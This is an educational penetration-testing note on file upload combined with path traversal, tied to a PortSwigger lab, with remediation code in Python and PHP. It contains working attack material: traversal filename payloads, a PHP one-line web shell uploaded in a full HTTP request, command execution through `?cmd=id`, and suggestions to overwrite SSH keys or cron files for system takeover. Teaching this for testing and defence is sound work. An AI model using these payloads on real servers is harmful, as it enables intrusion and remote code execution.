---
tags: [vapt, file-upload, path-traversal, intermediate]
difficulty: intermediate
module: "22 - File Upload"
topic: "22.07 File Upload + Path Traversal"
portswigger_labs: ["Web shell upload via path traversal"]
---

# 22.07 — File Upload + Path Traversal

## What is it?
When an application allows a user to upload a file, it typically saves that file into a specific, safe directory (like `/var/www/html/uploads/`) where execution of server-side scripts is disabled. However, if the application trusts the `filename` provided by the user in the upload request without properly sanitizing it, an attacker can combine file upload with a path traversal attack.

By injecting path traversal characters (like `../`) into the filename, the attacker can force the application to save the uploaded file *outside* of the designated safe upload directory. This allows the attacker to drop a malicious script (like a PHP webshell) directly into the web root, overwrite existing configuration files, or place files in directories where execution is allowed.

Think of it like a hotel guest who is given a box to put their valuables in for safekeeping, but they write on the box "Take this out of the safe and put it on the front desk." If the hotel staff blindly follows the instructions written on the box, the security boundary is bypassed.

## ASCII Diagram
```text
[Attacker]
   │
   │ 1. Uploads shell.php with filename: "../shell.php"
   ▼
[Web Server]
   │
   │ 2. Appends filename to the safe upload directory:
   │    /var/www/html/uploads/ + ../shell.php
   ▼
[Operating System]
   │
   │ 3. Resolves the path: /var/www/html/uploads/../shell.php
   │ 4. Path traversal normalizes to: /var/www/html/shell.php
   ▼
[File System] ─── 5. Saves shell.php directly into the Web Root!
```

## How to Find It
- **Manual steps:**
  1. Identify a file upload endpoint using a proxy like Burp Suite.
  2. Intercept the upload request and locate the `filename="something.jpg"` parameter in the `Content-Disposition` header.
  3. Modify the filename to include relative traversal characters (e.g., `filename="../test.txt"`).
  4. Send the request and observe if the upload is successful.
  5. Attempt to access the file in the parent directory (`https://target.com/test.txt` instead of `https://target.com/uploads/test.txt`).

- **Tool commands with flags explained:**
  To automate testing various path traversal bypasses in filenames, you can use `ffuf` alongside a custom wordlist:
  ```bash
  # Create a small list of payloads
  cat << 'EOF' > traversal_filenames.txt
  ../shell.php
  ../../shell.php
  ..%2fshell.php
  ....//shell.php
  EOF
  
  # Use ffuf to fuzz the filename parameter
  # (Requires custom request file mapping the payload to the filename field)
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Intercept a legitimate file upload request.
  2. Change the `filename` attribute to contain a traversal payload aimed at a directory where execution is permitted (usually the web root, e.g., `../../shell.php`).
  3. If the server filters `../`, try bypass techniques like URL encoding (`..%2f`), double URL encoding (`..%252f`), or non-recursive stripping bypasses (`....//`).
  4. Submit the request.
  5. Navigate to the location where the file was saved to execute your payload.

- **Actual payloads:**
  **Standard Traversal:**
  ```text
  filename="../shell.php"
  ```
  **Bypassing Non-Recursive Stripping (if `../` is replaced with empty string once):**
  ```text
  filename="....//shell.php"
  ```
  **URL Encoded:**
  ```text
  filename="..%2fshell.php"
  ```

- **Real HTTP request/response examples:**
  **Upload Request (Intercepted & Modified):**
  ```http
  POST /upload.php HTTP/1.1
  Host: target.com
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="avatar"; filename="../shell.php"
  Content-Type: image/jpeg

  <?php system($_GET['cmd']); ?>
  ------WebKitFormBoundary--
  ```
  **Response:**
  ```http
  HTTP/1.1 200 OK
  
  File successfully uploaded!
  ```
  **Execution Request:**
  ```http
  GET /shell.php?cmd=id HTTP/1.1
  Host: target.com
  
  HTTP/1.1 200 OK
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

## Real-World Example
In a classic PortSwigger lab scenario, an application allows users to upload avatars. The server strictly enforces that scripts cannot be executed within the `/avatars/` directory using an Apache `.htaccess` file. However, the application fails to sanitize the `filename` parameter. By intercepting the upload and changing the filename to `..%2fexploit.php`, the attacker forces the server to save the file to the parent directory (which lacks the `.htaccess` execution restrictions). The attacker then simply browses to `/exploit.php` to gain Remote Code Execution.

## How to Fix It
- **Developer remediation:**
  Never trust the filename provided by the user. The most secure approach is to completely discard the user's filename and generate a new, random filename (like a UUID) on the server. If you absolutely must keep the original filename, you must strictly extract only the basename (stripping all directory paths) and remove any dangerous characters.

- **Code snippet:**
  **Python (Best Practice - Generate Random Name):**
  ```python
  import uuid
  import os

  def save_upload(file_data, original_filename):
      # Discard the original name entirely
      # Use a secure extension mapping based on validated MIME type, not input
      extension = ".jpg" 
      safe_name = str(uuid.uuid4()) + extension
      
      save_path = os.path.join('/var/www/uploads/', safe_name)
      
      with open(save_path, 'wb') as f:
          f.write(file_data)
  ```
  
  **PHP (Extract Basename):**
  ```php
  // Extract only the file name, dropping all directory traversal paths
  $safe_filename = basename($_FILES['uploaded_file']['name']);
  
  // Ensure the target directory is strict
  $target_path = "/var/www/uploads/" . $safe_filename;
  
  move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $target_path);
  ```

## Chaining Opportunities
- This vuln + [[14 - Overwriting Existing Files]] → Use path traversal to step out of the upload directory and deliberately overwrite critical application files, such as `/var/www/html/index.php` or `/var/www/html/config.php`.
- This vuln + [[Missing File Permissions / Sudo Privileges]] → On Linux systems, if the web server process runs as root or a highly privileged user, traverse the file system to overwrite `/etc/cron.d/backdoor` or `/root/.ssh/authorized_keys` for instant operating system takeover.

## Related Notes
- [[02 - Unrestricted File Upload — Webshell Upload]]
- [[23.01 What is Path Traversal?]]
- [[15 - Defense — Extension Allowlists, Content Validation, Separate Storage]]
